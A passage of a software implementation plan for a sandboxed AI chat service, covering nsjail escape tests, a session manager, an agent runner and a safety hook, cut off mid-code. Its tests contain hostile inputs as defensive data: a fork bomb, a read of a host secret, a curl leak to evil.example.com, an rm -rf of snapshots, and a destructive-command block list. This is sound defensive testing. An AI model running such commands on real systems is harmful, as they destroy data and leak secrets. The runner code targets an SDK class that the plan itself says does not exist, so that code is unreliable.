async def test_jailed_spawn_runs_python_inside(tmp_path: Path):
    template = Path("config/nsjail/chat-session.cfg.template")
    assert template.exists()
    prov = SubprocessProvider(
        nsjail_path=shutil.which("nsjail"),
        nsjail_config_template=template,
        require_isolation=True,
    )
    handle = await prov.spawn(
        workdir=tmp_path, env={},
        argv=["/usr/bin/python3", "-c", "print('inside')"],
    )
    out = await handle.stdout.read(200)
    assert b"inside" in out
    rc = await handle.wait()
    assert rc == 0
```

- [ ] **Step 4: Add escape-attempt smoke tests**

```python
# tests/security/test_nsjail_escape.py
import shutil
import sys
from pathlib import Path

import pytest

from app.chat.subprocess_provider import SubprocessProvider


def _skip_unless_nsjail():
    if shutil.which("nsjail") is None or sys.platform == "darwin":
        pytest.skip("nsjail not installed or darwin")


@pytest.mark.asyncio
async def test_cannot_read_outside_workdir(tmp_path: Path):
    _skip_unless_nsjail()
    prov = SubprocessProvider(
        nsjail_path=shutil.which("nsjail"),
        nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
        require_isolation=True,
    )
    secret = tmp_path.parent / "host-secret"
    secret.write_text("forbidden")
    handle = await prov.spawn(
        workdir=tmp_path, env={},
        argv=["/usr/bin/python3", "-c",
              f"open('{secret}').read()"],
    )
    rc = await handle.wait()
    assert rc != 0  # blocked


@pytest.mark.asyncio
async def test_cannot_curl_external(tmp_path: Path):
    _skip_unless_nsjail()
    prov = SubprocessProvider(
        nsjail_path=shutil.which("nsjail"),
        nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
        require_isolation=True,
    )
    handle = await prov.spawn(
        workdir=tmp_path, env={"PATH": "/usr/bin"},
        argv=["/usr/bin/curl", "--max-time", "2", "https://www.google.com"],
    )
    rc = await handle.wait()
    assert rc != 0  # blocked by iptables OWNER allowlist


@pytest.mark.asyncio
async def test_fork_bomb_capped(tmp_path: Path):
    _skip_unless_nsjail()
    prov = SubprocessProvider(
        nsjail_path=shutil.which("nsjail"),
        nsjail_config_template=Path("config/nsjail/chat-session.cfg.template"),
        require_isolation=True,
    )
    handle = await prov.spawn(
        workdir=tmp_path, env={},
        argv=["/bin/sh", "-c", ":(){ :|:& };:"],
    )
    rc = await asyncio.wait_for(handle.wait(), timeout=10)
    assert rc != 0
```

- [ ] **Step 5: Run all chat provider tests**

```
.venv/bin/pytest tests/test_chat_subprocess_provider.py tests/security/test_nsjail_escape.py -v
```

- [ ] **Step 6: Commit**

```
git add app/chat/subprocess_provider.py config/nsjail/chat-session.cfg.template \
        tests/test_chat_subprocess_provider.py tests/security/test_nsjail_escape.py
git commit -m "feat(chat): nsjail config template + jailed-mode spawn + escape smoke tests"
```

---

## Phase 5 — ChatManager (session state machine)

ChatManager is the central coordinator. Spec § Sub-agent build plan
designates its **public interface** as Track A's first commit so
Tracks B/C/D can mock against it. Implementation comes incrementally.

### Task 5.1: ChatManager interface + create_session

**Files:**
- Create: `app/chat/manager.py`
- Create: `app/chat/audit.py`
- Test:   `tests/test_chat_manager.py`

- [ ] **Step 1: Failing tests for create_session**

```python
# tests/test_chat_manager.py
import asyncio
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest
from src.db import migrate, open_db

from app.chat.config import ChatConfig
from app.chat.manager import ChatManager, ConcurrencyCapHit
from app.chat.persistence import ChatRepository
from app.chat.types import Surface
from app.chat.workdir import WorkdirManager


def _make_workdir_mgr(tmp_path: Path, repo: ChatRepository) -> WorkdirManager:
    bundled = tmp_path / "bundled"
    bundled.mkdir()
    (bundled / "CLAUDE.md").write_text("d")
    return WorkdirManager(
        data_dir=tmp_path / "data",
        repo=repo,
        bundled_template_dir=bundled,
        server_url="https://example",
        agnes_version="0.55.0",
        get_marketplace_sha=lambda: "sha-1",
        get_template_status=lambda: None,
    )


@pytest.fixture
def manager(tmp_path: Path) -> ChatManager:
    conn = open_db(tmp_path / "system.duckdb")
    migrate(conn)
    repo = ChatRepository(conn)
    workdir_mgr = _make_workdir_mgr(tmp_path, repo)
    provider = MagicMock()
    provider.spawn = AsyncMock()
    return ChatManager(
        provider=provider,
        workdir_mgr=workdir_mgr,
        repo=repo,
        config=ChatConfig(enabled=True, require_isolation=False, concurrency_per_user=2),
    )


@pytest.mark.asyncio
async def test_create_session_persists(manager: ChatManager):
    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    assert s.id.startswith("chat_")
    assert s.surface == Surface.WEB


@pytest.mark.asyncio
async def test_concurrency_cap_enforced(manager: ChatManager):
    await manager.create_session(user_email="u@x", surface=Surface.WEB)
    await manager.attach(...)  # placeholder — real attach in Task 5.2
```

Mark the second test `@pytest.mark.skip("attach implemented in 5.2")`
so it doesn't break the build now.

- [ ] **Step 2: Implement interface skeleton**

```python
# app/chat/manager.py
"""ChatManager: session state machine, lifecycle, WS attachment."""
from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional

from app.chat.config import ChatConfig
from app.chat.persistence import ChatRepository
from app.chat.provider import SandboxHandle, SandboxProvider
from app.chat.types import ChatSession, SessionState, Surface
from app.chat.workdir import WorkdirManager

logger = logging.getLogger(__name__)


class ConcurrencyCapHit(Exception):
    """Raised when a user already has the maximum allowed active sessions."""


class SessionNotFound(Exception):
    pass


@dataclass
class LiveSession:
    chat_id: str
    user_email: str
    state: SessionState
    handle: Optional[SandboxHandle]
    ws: object  # WebSocket; typed loosely to avoid FastAPI import cycle
    started_at: datetime
    last_activity: datetime
    crash_count: int = 0
    cancel_event: asyncio.Event = field(default_factory=asyncio.Event)
    tasks: list[asyncio.Task] = field(default_factory=list)


class ChatManager:
    def __init__(
        self,
        *,
        provider: SandboxProvider,
        workdir_mgr: WorkdirManager,
        repo: ChatRepository,
        config: ChatConfig,
    ) -> None:
        self._provider = provider
        self._workdir_mgr = workdir_mgr
        self._repo = repo
        self._config = config
        self._live: dict[str, LiveSession] = {}
        self._idle_task: Optional[asyncio.Task] = None

    # --- public API used by app/api/chat.py and services/slack_bot/ -------

    async def create_session(
        self,
        *,
        user_email: str,
        surface: Surface,
        slack_channel_id: Optional[str] = None,
        slack_thread_ts: Optional[str] = None,
        title: Optional[str] = None,
    ) -> ChatSession:
        if not self._config.enabled:
            raise RuntimeError("chat.enabled is false")
        active = self._active_count_for_user(user_email)
        if active >= self._config.concurrency_per_user:
            raise ConcurrencyCapHit(
                f"user {user_email} has {active} active sessions; cap = "
                f"{self._config.concurrency_per_user}"
            )
        # De-dupe Slack DM / thread to existing live session
        if surface == Surface.SLACK_DM and slack_channel_id:
            existing = self._repo.get_slack_dm_session(slack_channel_id)
            if existing is not None:
                return existing
        if surface == Surface.SLACK_THREAD and slack_channel_id and slack_thread_ts:
            existing = self._repo.get_slack_thread_session(slack_channel_id, slack_thread_ts)
            if existing is not None:
                return existing
        return self._repo.create_session(
            user_email=user_email, surface=surface,
            slack_channel_id=slack_channel_id, slack_thread_ts=slack_thread_ts,
            title=title,
        )

    def _active_count_for_user(self, user_email: str) -> int:
        return sum(
            1 for s in self._live.values()
            if s.user_email == user_email and s.state in (SessionState.NEW, SessionState.ACTIVE, SessionState.IDLE)
        )

    def list_live(self) -> list[LiveSession]:
        return list(self._live.values())

    async def shutdown(self) -> None:
        chat_ids = list(self._live.keys())
        for chat_id in chat_ids:
            try:
                await self.kill(chat_id, reason="server_shutdown")
            except Exception:
                logger.exception("error killing session %s on shutdown", chat_id)

    # --- placeholders implemented in Task 5.2 -----------------------------

    async def attach(self, chat_id: str, ws) -> None:
        raise NotImplementedError("Task 5.2")

    async def send_user_message(self, chat_id: str, text: str) -> None:
        raise NotImplementedError("Task 5.2")

    async def cancel(self, chat_id: str) -> None:
        raise NotImplementedError("Task 5.2")

    async def kill(self, chat_id: str, *, reason: str) -> None:
        # Minimal impl so shutdown works.
        live = self._live.pop(chat_id, None)
        if live and live.handle is not None:
            await live.handle.kill()
        for t in (live.tasks if live else []):
            t.cancel()
```

- [ ] **Step 3: Add audit helper**

```python
# app/chat/audit.py
"""audit_log writer for chat events. Re-uses Agnes's existing audit table."""
from __future__ import annotations

import hashlib
import json
import logging
from datetime import datetime, timezone
from typing import Any, Optional

import duckdb

logger = logging.getLogger(__name__)


def write_audit(
    conn: duckdb.DuckDBPyConnection,
    *,
    user_email: str,
    action: str,
    details: dict[str, Any],
) -> None:
    """Best-effort insert into audit_log; failure is logged, not raised.

    Task 5.1 confirmed the actual `audit_log` schema in src/db.py uses
    `user_id` and `params` columns (not `user_email` / `details`); the
    keyword args above keep the chat-side API stable while the SQL
    INSERT maps to the real columns.
    """
    import secrets
    audit_id = f"audit_{secrets.token_hex(6)}"
    try:
        conn.execute(
            "INSERT INTO audit_log (id, timestamp, user_id, action, params)"
            " VALUES (?, ?, ?, ?, ?)",
            [audit_id, datetime.now(timezone.utc), user_email, action, json.dumps(details)],
        )
    except Exception:
        logger.exception("audit_log write failed: action=%s", action)


def hash_args(args: Any) -> str:
    raw = json.dumps(args, sort_keys=True, default=str).encode("utf-8")
    return hashlib.sha256(raw).hexdigest()[:16]
```

- [ ] **Step 4: Run + commit**

```
.venv/bin/pytest tests/test_chat_manager.py::test_create_session_persists -v
git add app/chat/manager.py app/chat/audit.py tests/test_chat_manager.py
git commit -m "feat(chat): ChatManager interface + create_session + audit helper

Pinned-interface-first commit per spec § Build plan — Tracks B/C/D
can mock against this without waiting for Tasks 5.2+."
```

### Task 5.2: attach + WS pump + send + cancel + crash recovery + idle

**Files:**
- Modify: `app/chat/manager.py` (implement placeholders)
- Test:   `tests/test_chat_manager.py` (un-skip + add)

- [ ] **Step 1: Failing tests for attach + send + cancel + crash**

```python
# Append to tests/test_chat_manager.py
import json


class FakeWS:
    def __init__(self) -> None:
        self.sent: list[dict] = []
        self.closed = False

    async def send_json(self, data: dict) -> None:
        self.sent.append(data)

    async def close(self) -> None:
        self.closed = True


class FakeHandle:
    def __init__(self) -> None:
        self.pid = 1234
        self._lines: asyncio.Queue[bytes] = asyncio.Queue()
        self._stdin_buf: list[bytes] = []
        self.killed = False

    @property
    def stdin(self):
        outer = self

        class S:
            def write(self, b: bytes) -> None:
                outer._stdin_buf.append(b)

            async def drain(self) -> None:
                return None

        return S()

    @property
    def stdout(self):
        outer = self

        class O:
            async def readline(self) -> bytes:
                return await outer._lines.get()

        return O()

    @property
    def stderr(self):
        return self.stdout

    async def wait(self) -> int:
        # block until killed
        while not self.killed:
            await asyncio.sleep(0.01)
        return 137

    async def kill(self, *, grace_sec: float = 5.0) -> None:
        self.killed = True

    # Test helpers
    def emit(self, payload: dict) -> None:
        self._lines.put_nowait((json.dumps(payload) + "\n").encode())

    def emit_eof(self) -> None:
        self._lines.put_nowait(b"")


@pytest.mark.asyncio
async def test_attach_pumps_tokens_to_ws(manager: ChatManager):
    handle = FakeHandle()
    manager._provider.spawn = AsyncMock(return_value=handle)

    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    ws = FakeWS()
    attach_task = asyncio.create_task(manager.attach(s.id, ws))
    await asyncio.sleep(0.05)
    handle.emit({"type": "token", "text": "Hi"})
    await asyncio.sleep(0.05)
    assert {"type": "token", "text": "Hi"} in ws.sent

    await manager.kill(s.id, reason="test_done")
    handle.emit_eof()
    await attach_task


@pytest.mark.asyncio
async def test_send_writes_to_stdin(manager: ChatManager):
    handle = FakeHandle()
    manager._provider.spawn = AsyncMock(return_value=handle)
    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    ws = FakeWS()
    attach_task = asyncio.create_task(manager.attach(s.id, ws))
    await asyncio.sleep(0.05)
    await manager.send_user_message(s.id, "hello")
    assert any(b'"hello"' in b for b in handle._stdin_buf)
    await manager.kill(s.id, reason="test_done")
    handle.emit_eof()
    await attach_task


@pytest.mark.asyncio
async def test_cancel_emits_synthetic_tool_result(manager: ChatManager):
    handle = FakeHandle()
    manager._provider.spawn = AsyncMock(return_value=handle)
    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    ws = FakeWS()
    attach_task = asyncio.create_task(manager.attach(s.id, ws))
    await asyncio.sleep(0.05)
    handle.emit({"type": "tool_call", "tool": "run_query", "args": {}})
    await asyncio.sleep(0.05)
    await manager.cancel(s.id)
    await asyncio.sleep(0.05)
    cancelled = [m for m in ws.sent if m.get("type") == "cancelled"]
    assert cancelled, "expected a {'type': 'cancelled'} frame after cancel"
    await manager.kill(s.id, reason="test_done")
    handle.emit_eof()
    await attach_task


@pytest.mark.asyncio
async def test_crash_respawns_with_notice(manager: ChatManager):
    handles = [FakeHandle(), FakeHandle()]
    spawn_calls = iter(handles)
    async def fake_spawn(**kw):
        return next(spawn_calls)
    manager._provider.spawn = fake_spawn

    s = await manager.create_session(user_email="u@x", surface=Surface.WEB)
    ws = FakeWS()
    attach_task = asyncio.create_task(manager.attach(s.id, ws))
    await asyncio.sleep(0.05)
    # Simulate crash by signalling EOF and non-zero exit
    handles[0].emit_eof()
    handles[0].killed = True  # makes wait() return 137 immediately
    await asyncio.sleep(0.1)
    crashed = [m for m in ws.sent if m.get("type") == "error" and m.get("kind") == "subprocess_crashed"]
    assert crashed, "expected crash notice"
    ready = [m for m in ws.sent if m.get("type") == "ready"]
    assert ready, "expected ready frame after respawn"

    await manager.kill(s.id, reason="test_done")
    handles[1].emit_eof()
    await attach_task
```

- [ ] **Step 2: Implement attach + WS pump**

Replace the placeholder methods in `app/chat/manager.py`:

```python
import json
import os
import sys
from app.chat.audit import write_audit, hash_args


async def attach(self, chat_id: str, ws) -> None:
    session = self._repo.get_session(chat_id)
    if session is None:
        raise SessionNotFound(chat_id)

    workspace = self._workdir_mgr.ensure_user_workdir(session.user_email)  # noqa
    session_dir = self._workdir_mgr.prepare_session_dir(session.user_email, chat_id)

    handle = await self._spawn_runner(session, session_dir)
    live = LiveSession(
        chat_id=chat_id, user_email=session.user_email,
        state=SessionState.ACTIVE, handle=handle, ws=ws,
        started_at=datetime.now(timezone.utc),
        last_activity=datetime.now(timezone.utc),
    )
    self._live[chat_id] = live
    await ws.send_json({"type": "ready"})

    pump_task = asyncio.create_task(self._pump_subprocess_to_ws(live))
    wait_task = asyncio.create_task(self._wait_for_exit_and_respawn(live, session_dir))
    live.tasks = [pump_task, wait_task]

    try:
        await asyncio.gather(*live.tasks, return_exceptions=True)
    finally:
        await self.kill(chat_id, reason="ws_disconnect")


async def _spawn_runner(self, session: ChatSession, session_dir: Path):
    env = {
        "AGNES_TOKEN": os.environ.get("AGNES_SESSION_JWT_SEED", ""),  # filled by API layer
        "AGNES_API": os.environ.get("AGNES_INTERNAL_URL", "http://127.0.0.1:8000"),
        "AGNES_SESSION_ID": session.id,
        "AGNES_USER_EMAIL": session.user_email,
        "AGNES_DAILY_BUDGET_USD": str(self._config.daily_anthropic_spend_usd),
        "AGNES_PER_TOOL_CALL_SECONDS": str(self._config.per_tool_call_seconds),
        "PATH": "/usr/bin:/bin",
        "HOME": str(session_dir),
        "TERM": "dumb",
        "LANG": "C.UTF-8",
        "PYTHONUNBUFFERED": "1",
    }
    argv = [sys.executable, "-m", "app.chat.runner", "--session-id", session.id]
    return await self._provider.spawn(workdir=session_dir, env=env, argv=argv)


async def _pump_subprocess_to_ws(self, live: LiveSession) -> None:
    assert live.handle is not None
    while True:
        line = await live.handle.stdout.readline()
        if not line:
            return
        try:
            frame = json.loads(line)
        except json.JSONDecodeError:
            continue
        live.last_activity = datetime.now(timezone.utc)
        try:
            await live.ws.send_json(frame)
        except Exception:
            logger.warning("ws send failed for %s", live.chat_id)
            return
        if frame.get("type") == "assistant_message":
            self._repo.append_message(
                session_id=live.chat_id, role="assistant",
                content=frame.get("content", ""),
                tool_calls=frame.get("tool_calls"),
                tokens_in=frame.get("tokens_in"),
                tokens_out=frame.get("tokens_out"),
                model=frame.get("model"),
            )
        elif frame.get("type") == "tool_call":
            write_audit(
                self._repo._conn,
                user_email=live.user_email,
                action="chat.tool_call",
                details={
                    "session_id": live.chat_id,
                    "tool": frame.get("tool"),
                    "args_hash": hash_args(frame.get("args", {})),
                },
            )


async def _wait_for_exit_and_respawn(self, live: LiveSession, session_dir: Path) -> None:
    assert live.handle is not None
    rc = await live.handle.wait()
    if rc == 0 or live.state == SessionState.DEAD:
        return
    # Crash path
    live.crash_count += 1
    await live.ws.send_json({
        "type": "error", "kind": "subprocess_crashed",
        "auto_respawn": live.crash_count < 3,
    })
    if live.crash_count >= 3:
        live.state = SessionState.DEAD
        return
    session = self._repo.get_session(live.chat_id)
    if session is None:
        return
    new_handle = await self._spawn_runner(session, session_dir)
    live.handle = new_handle
    live.state = SessionState.ACTIVE
    await live.ws.send_json({"type": "ready"})
    # Replay last 3 turns
    history = self._repo.list_messages(live.chat_id)[-3:]
    for msg in history:
        if msg.role == "user":
            payload = json.dumps({"type": "user_msg", "text": msg.content}) + "\n"
            new_handle.stdin.write(payload.encode("utf-8"))
            await new_handle.stdin.drain()
    # Restart pump on the new handle
    asyncio.create_task(self._pump_subprocess_to_ws(live))


async def send_user_message(self, chat_id: str, text: str) -> None:
    live = self._live.get(chat_id)
    if live is None or live.handle is None or live.state == SessionState.DEAD:
        raise SessionNotFound(chat_id)
    self._repo.append_message(session_id=chat_id, role="user", content=text)
    payload = json.dumps({"type": "user_msg", "text": text}) + "\n"
    live.handle.stdin.write(payload.encode("utf-8"))
    await live.handle.stdin.drain()
    live.last_activity = datetime.now(timezone.utc)
    live.state = SessionState.ACTIVE


async def cancel(self, chat_id: str) -> None:
    live = self._live.get(chat_id)
    if live is None or live.handle is None:
        return
    payload = json.dumps({"type": "cancel"}) + "\n"
    live.handle.stdin.write(payload.encode("utf-8"))
    await live.handle.stdin.drain()
    await live.ws.send_json({"type": "cancelled"})


async def kill(self, chat_id: str, *, reason: str) -> None:
    live = self._live.pop(chat_id, None)
    if live is None:
        return
    live.state = SessionState.DEAD
    if live.handle is not None:
        await live.handle.kill()
    for t in live.tasks:
        t.cancel()
    write_audit(
        self._repo._conn,
        user_email=live.user_email,
        action="chat.session_killed",
        details={"session_id": chat_id, "reason": reason},
    )
```

(Methods above are class methods of `ChatManager` — Devin attaches them
inside the class body rather than at module scope.)

- [ ] **Step 3: Idle reaper loop**

Add at the end of `__init__` and as method:

```python
def start_idle_reaper(self) -> None:
    if self._idle_task is None or self._idle_task.done():
        self._idle_task = asyncio.create_task(self._idle_reaper_loop())


async def _idle_reaper_loop(self) -> None:
    while True:
        await asyncio.sleep(60)
        cutoff_age = self._config.idle_ttl_seconds
        now = datetime.now(timezone.utc)
        to_kill = [
            chat_id for chat_id, live in list(self._live.items())
            if (now - live.last_activity).total_seconds() > cutoff_age
        ]
        for chat_id in to_kill:
            await self.kill(chat_id, reason="idle_ttl")
```

`start_idle_reaper` is called by `app/main.py` startup hook.

- [ ] **Step 4: Run all manager tests**

```
.venv/bin/pytest tests/test_chat_manager.py -v
```

Expected: all green.

- [ ] **Step 5: Commit**

```
git add app/chat/manager.py tests/test_chat_manager.py
git commit -m "feat(chat): ChatManager attach/send/cancel/crash-respawn/idle reaper"
```

---

## Phase 6 — Runner (in-subprocess entrypoint)

`app/chat/runner.py` is the Python entrypoint nsjail-spawned
subprocess invokes. Loads `claude-agent-sdk`, sets the working
directory, reads env-injected auth, parses JSON line frames from
stdin, emits JSON line frames to stdout.

### Task 6.1: Runner — JSON-line protocol + agent-sdk loop

> **SDK reality check (Task 0.2 surfaced this — applied to plan 2026-05-28):**
> `claude-agent-sdk` 0.2.87 (the installed version) does **not** export a
> class named `Agent`. The actual primary entrypoints are:
>
> - `claude_agent_sdk.query(...)` — async-generator function, single-turn
>   or streaming consumption.
> - `claude_agent_sdk.ClaudeSDKClient(...)` — class for persistent
>   sessions; methods include `connect()`, `query(...)`, and
>   `receive_response()` (async-iter).
>
> The skeleton in Step 2 below was sketched against an imagined `Agent`
> class. Implementer of this task **must** verify the actual SDK surface
> with `.venv/bin/python -c "import claude_agent_sdk; help(claude_agent_sdk.ClaudeSDKClient); help(claude_agent_sdk.query)"`
> and adapt the inbound/outbound loop accordingly. The protocol on the
> stdin/stdout boundary (`runner_ready`, `user_msg`, `token`,
> `tool_call`, `tool_result`, `assistant_message`, `cancel`, `error`)
> does NOT need to change — only the SDK binding inside `_real_agent_loop`
> does. Use `ClaudeSDKClient` for the persistent-session model the chat
> manager needs (`connect()` once, then iterate `receive_response()` per
> turn). Look up the actual event/message type names (`AssistantMessage`,
> `UserMessage`, `TextBlock`, `ToolUseBlock`, `ToolResultBlock`,
> `StreamEvent`) and map them to the outbound JSON frames.

**Files:**
- Create: `app/chat/runner.py`
- Test:   `tests/test_chat_runner.py`

- [ ] **Step 1: Failing test for protocol echo (no SDK; uses fake)**

```python
# tests/test_chat_runner.py
import asyncio
import json
import os
import subprocess
import sys
from pathlib import Path

import pytest


@pytest.mark.asyncio
async def test_runner_emits_ready_then_echoes_with_fake_agent(tmp_path: Path, monkeypatch):
    env = os.environ.copy()
    env["AGNES_RUNNER_FAKE_AGENT"] = "1"  # turns off real SDK call
    env["AGNES_SESSION_ID"] = "chat_test"
    env["AGNES_USER_EMAIL"] = "u@x"
    env["AGNES_API"] = "http://127.0.0.1:8000"
    env["AGNES_TOKEN"] = "fake"
    env["AGNES_DAILY_BUDGET_USD"] = "20"
    env["AGNES_PER_TOOL_CALL_SECONDS"] = "90"

    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "app.chat.runner", "--session-id", "chat_test",
        stdin=asyncio.subprocess.PIPE, stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE, env=env, cwd=str(tmp_path),
    )
    assert proc.stdin and proc.stdout

    line = await proc.stdout.readline()
    frame = json.loads(line)
    assert frame == {"type": "runner_ready"}

    proc.stdin.write((json.dumps({"type": "user_msg", "text": "hi"}) + "\n").encode())
    await proc.stdin.drain()

    # Fake-agent mode echoes back as assistant_message
    line = await proc.stdout.readline()
    frame = json.loads(line)
    assert frame["type"] == "assistant_message"
    assert "hi" in frame["content"]

    proc.stdin.close()
    rc = await proc.wait()
    assert rc == 0
```

- [ ] **Step 2: Implement `app/chat/runner.py`**

```python
"""In-subprocess entrypoint. Runs claude-agent-sdk inside the chat sandbox.

Stdin: JSON lines, one per frame. Inbound types: user_msg, cancel.
Stdout: JSON lines. Outbound types: runner_ready, token, tool_call,
        tool_result, assistant_message, error, done.

Env (set by ChatManager via SubprocessProvider):
- AGNES_SESSION_ID, AGNES_USER_EMAIL, AGNES_API, AGNES_TOKEN
- AGNES_DAILY_BUDGET_USD, AGNES_PER_TOOL_CALL_SECONDS
"""
from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
from pathlib import Path
from typing import Optional


def _emit(frame: dict) -> None:
    sys.stdout.write(json.dumps(frame) + "\n")
    sys.stdout.flush()


async def _stdin_lines() -> "asyncio.Queue[dict]":
    queue: asyncio.Queue[dict] = asyncio.Queue()

    async def reader() -> None:
        loop = asyncio.get_running_loop()
        reader_obj = asyncio.StreamReader()
        protocol = asyncio.StreamReaderProtocol(reader_obj)
        await loop.connect_read_pipe(lambda: protocol, sys.stdin)
        while True:
            line = await reader_obj.readline()
            if not line:
                await queue.put({"type": "_eof"})
                return
            try:
                await queue.put(json.loads(line))
            except json.JSONDecodeError:
                continue

    asyncio.create_task(reader())
    return queue


async def _fake_agent_loop(queue: "asyncio.Queue[dict]") -> None:
    """Used by tests via AGNES_RUNNER_FAKE_AGENT=1. Echoes user_msg back."""
    while True:
        frame = await queue.get()
        if frame.get("type") == "_eof":
            return
        if frame.get("type") == "user_msg":
            _emit({
                "type": "assistant_message",
                "content": f"echo: {frame.get('text', '')}",
                "tokens_in": 1, "tokens_out": 1,
                "model": "fake",
            })


async def _real_agent_loop(queue: "asyncio.Queue[dict]", workdir: Path) -> None:
    """Real claude-agent-sdk-backed loop.

    The SDK is a moving target; this loop is the integration point.
    Devin reading: read the installed SDK docs (`python -c "import
    claude_agent_sdk; help(claude_agent_sdk)"`) and bind the
    following events:
      - text token  → emit {"type": "token", "text": ...}
      - tool call   → emit {"type": "tool_call", "tool": ..., "args": ...}
      - tool result → emit {"type": "tool_result", "tool": ..., "result": ...}
      - turn end    → emit {"type": "assistant_message", content, tokens_in, tokens_out, model}
    Inbound:
      - user_msg    → agent.send_message(text)
      - cancel      → agent.cancel_active_turn()  (or equivalent)
    Per-tool-call wall clock (env AGNES_PER_TOOL_CALL_SECONDS) is
    enforced by wrapping tool handlers in asyncio.wait_for; on timeout
    emit a synthetic tool_result with {"timeout": true} and abort.
    """
    from claude_agent_sdk import Agent  # type: ignore

    agent = Agent(
        workdir=str(workdir),
        # SDK passes its own auth; AGNES_TOKEN is for /api/* call-backs.
    )

    async def handle_inbound() -> None:
        while True:
            frame = await queue.get()
            t = frame.get("type")
            if t == "_eof":
                await agent.aclose()
                return
            if t == "user_msg":
                await agent.send_user_message(frame.get("text", ""))
            elif t == "cancel":
                await agent.cancel_active_turn()

    async def handle_outbound() -> None:
        async for event in agent.events():
            if event.kind == "token":
                _emit({"type": "token", "text": event.text})
            elif event.kind == "tool_call":
                _emit({"type": "tool_call", "tool": event.tool, "args": event.args})
            elif event.kind == "tool_result":
                _emit({"type": "tool_result", "tool": event.tool, "result": event.result})
            elif event.kind == "turn_end":
                _emit({
                    "type": "assistant_message",
                    "content": event.text,
                    "tool_calls": [
                        {"tool": tc.tool, "args": tc.args} for tc in event.tool_calls
                    ],
                    "tokens_in": event.usage.input_tokens,
                    "tokens_out": event.usage.output_tokens,
                    "model": event.model,
                })

    await asyncio.gather(handle_inbound(), handle_outbound(), return_exceptions=True)


async def amain() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-id", required=True)
    args = parser.parse_args()

    workdir = Path(os.environ.get("AGNES_WORKDIR", os.getcwd()))

    _emit({"type": "runner_ready"})
    queue = await _stdin_lines()

    if os.environ.get("AGNES_RUNNER_FAKE_AGENT") == "1":
        await _fake_agent_loop(queue)
    else:
        try:
            await _real_agent_loop(queue, workdir)
        except Exception as exc:
            _emit({"type": "error", "kind": "runner_exception", "message": str(exc)})
            raise


def main() -> None:
    try:
        asyncio.run(amain())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
```

- [ ] **Step 3: Run test**

```
.venv/bin/pytest tests/test_chat_runner.py -v
```

- [ ] **Step 4: Commit**

```
git add app/chat/runner.py tests/test_chat_runner.py
git commit -m "feat(chat): runner — JSON-line stdin/stdout protocol + claude-agent-sdk loop

Fake-agent mode (AGNES_RUNNER_FAKE_AGENT=1) used by integration tests
that don't have an Anthropic API key."
```

---

## Phase 7 — Default PreToolUse safety hook bundled in workspace template

Lives at `app/initial_workspace_default/.claude/hooks/pre_tool_use.py`
inside the bundled template. Refuses workspace-destructive bash, denies
outbound network beyond allowlist (defense in depth), and prompts
before mutating admin tables.

### Task 7.1: Hook script + tests

**Files:**
- Create: `app/initial_workspace_default/.claude/hooks/pre_tool_use.py`
- Create: `app/initial_workspace_default/.claude/settings.json` (registers hook)
- Test:   `tests/test_default_pre_tool_use_hook.py`

- [ ] **Step 1: Failing tests**

```python
# tests/test_default_pre_tool_use_hook.py
import json
import subprocess
import sys
from pathlib import Path

HOOK = Path("app/initial_workspace_default/.claude/hooks/pre_tool_use.py")


def _run(payload: dict) -> tuple[int, dict]:
    proc = subprocess.run(
        [sys.executable, str(HOOK)],
        input=json.dumps(payload),
        capture_output=True, text=True, timeout=5,
    )
    return proc.returncode, json.loads(proc.stdout or "{}")


def test_refuses_rm_against_snapshots():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "rm -rf workspace/snapshots/q1"},
    })
    assert out.get("permissionDecision") == "deny"
    assert "snapshots" in out.get("permissionDecisionReason", "").lower()


def test_allows_normal_bash():
    rc, out = _run({"tool_name": "Bash", "tool_input": {"command": "ls"}})
    assert out.get("permissionDecision") in (None, "allow")


def test_refuses_curl_external_host():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://evil.example.com/leak"},
    })
    assert out.get("permissionDecision") == "deny"
    assert "network" in out.get("permissionDecisionReason", "").lower()


def test_allows_curl_to_anthropic():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "curl https://api.anthropic.com/v1/health"},
    })
    assert out.get("permissionDecision") in (None, "allow")


def test_prompts_for_admin_grant():
    rc, out = _run({
        "tool_name": "Bash",
        "tool_input": {"command": "agnes admin grant create --group Sales --table foo"},
    })
    assert out.get("permissionDecision") == "ask"
```

- [ ] **Step 2: Implement the hook**

```python
#!/usr/bin/env python3
"""Bundled PreToolUse safety hook.

Reads a JSON payload from stdin per the Claude Code hook spec, returns
a JSON decision object on stdout. Refuses workspace-destructive Bash
commands, hosts outside the Agnes egress allowlist, and prompts for
admin mutations.

Operators with an Initial Workspace Template override take
responsibility for shipping an equivalent hook (admin UI warns at
template upload time if absent).
"""
from __future__ import annotations

import json
import re
import sys

ALLOWED_HOSTS = {
    "127.0.0.1", "localhost",
    "api.anthropic.com",
    "api.github.com",
}

DESTRUCTIVE_PATHS = ("workspace/snapshots/", "workspace/scripts/")
DESTRUCTIVE_PREFIXES = ("rm ", "rm\t", "unlink ", "truncate -s 0", "shred ")

ADMIN_PROMPT_PREFIXES = (
    "agnes admin grant",
    "agnes admin group",
    "agnes admin user",
)


def _decide(payload: dict) -> dict:
    tool = payload.get("tool_name")
    if tool != "Bash":
        return {"permissionDecision": "allow"}
    cmd = (payload.get("tool_input") or {}).get("command", "")
    if not isinstance(cmd, str):
        return {"permissionDecision": "allow"}

    lower = cmd.strip().lower()

    # Destructive ops against persistent workspace dirs
    if any(p in cmd for p in DESTRUCTIVE_PATHS) and any(
        lower.startswith(pref) for pref in DESTRUCTIVE_PREFIXES
    ):
        return {
            "permissionDecision": "deny",
            "permissionDecisionReason":
